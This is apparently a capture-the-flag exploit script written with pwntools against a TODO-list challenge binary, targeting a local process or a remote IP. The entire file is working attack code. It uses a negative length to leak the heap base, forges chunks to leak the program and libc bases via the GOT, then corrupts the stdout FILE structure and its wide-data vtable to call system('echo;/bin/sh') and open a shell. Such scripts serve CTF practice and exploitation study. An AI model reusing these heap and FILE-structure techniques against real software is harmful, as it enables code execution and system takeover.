#!/bin/env python3
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall', aslr=False)
else:
    s = remote('65.109.221.18', 20417)

def add(title, length=1):
    s.sendlineafter(b'> ', b'1')
    s.sendlineafter(b'Title: ', title)
    s.sendlineafter(b'Length: ', str(length).encode())

def delete(title):
    s.sendlineafter(b'> ', b'2')
    s.sendlineafter(b'Title: ', title)

def edit(title, todo):
    s.sendlineafter(b'> ', b'3')
    s.sendlineafter(b'Title: ', title)
    s.sendlineafter(b'TODO: ', todo)

def show(title, skip=False):
    if not skip:
        s.sendlineafter(b'> ', b'4')
    s.sendlineafter(b'Title: ', title)
    s.recvuntil(b'TODO: ')
    return s.recvline(False)

def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

add(b'A')
delete(b'A')
add(b'A', -1)
heap_base = (u64(show('A').ljust(8, b'\0')) << 12) - 0x12000
log.info('heap base: %#x' % heap_base)

add(b'B', -1)
payload = b''
payload += b'A' * 0x18
payload += p64(0x61)
payload += p64(0) + p64(heap_base + 0x122d0)
payload += p64(0) * 2
payload += p64(heap_base + 0x12380) + p64(1)
payload += p64(0x42) + p64(0)
payload += p64(heap_base + 0x122d8)
edit(b'B', payload)

elf = ELF('./chall')
elf.address = u64(show(b'B').ljust(8, b'\0')) - 0x72c8
log.info('text base: %#x' % elf.address)

todo_end = elf.address + 0x72c8

payload = b''
payload += b'A' * 0x18
payload += p64(0x61)
payload += p64(1) + p64(todo_end)
payload += p64(0) + p64(heap_base + 0x123d0)
payload += p64(heap_base + 0x12300) + p64(1)
payload += p64(0x41) + p64(0)
payload += p64(elf.got['__stack_chk_fail'])
edit(b'A', payload)

libc = ELF('./libc.so.6')
libc.address = u64(show(b'A').ljust(8, b'\0')) - libc.symbols['__stack_chk_fail']
log.info('libc base: %#x' % libc.address)

wide_data_addr = heap_base + 0x12430

add(b'C', -1)
add(b'D', 0x140)
payload = b''
payload += b'A' * 0x18
payload += p64(0x61)
payload += p64(1) + p64(todo_end)
payload += p64(heap_base + 0x122d0) + p64(heap_base + 0x12580)
payload += p64(heap_base + 0x12400) + p64(1)
payload += p64(0x43) + p64(0)
payload += p64(libc.symbols['_IO_2_1_stdout_']) + p64(0xffffffff)
payload += p64(0) + p64(0x151)
# wide_data
payload += b'A' * 0x18
payload += p64(0)
payload += p64(heap_base + 0x100)
payload += p64(0) * 0x17
payload += p64(wide_data_addr + 0xe8 - 0x68)
payload += p64(libc.symbols['system'])
edit(b'C', payload)

# _IO_2_1_stdout_
payload = b''
payload += b'echo;/bin/sh'
payload += b'\0' * 4
payload += p64(0) * 7
payload += p64(0) * 4
payload += p64(libc.symbols['_IO_2_1_stdin_'])
payload += p64(1)
payload += p64(0xffffffffffffffff)
payload += p64(0x0000000)
payload += p64(libc.address + 0x205710)
payload += p64(0xffffffffffffffff)
payload += p64(0)
payload += p64(wide_data_addr)
payload += p64(0) * 3
payload += p64(0xffffffff)
payload += p64(0) * 2
payload += p64(libc.symbols['_IO_wfile_jumps'])
edit(b'C', payload)

s.interactive()
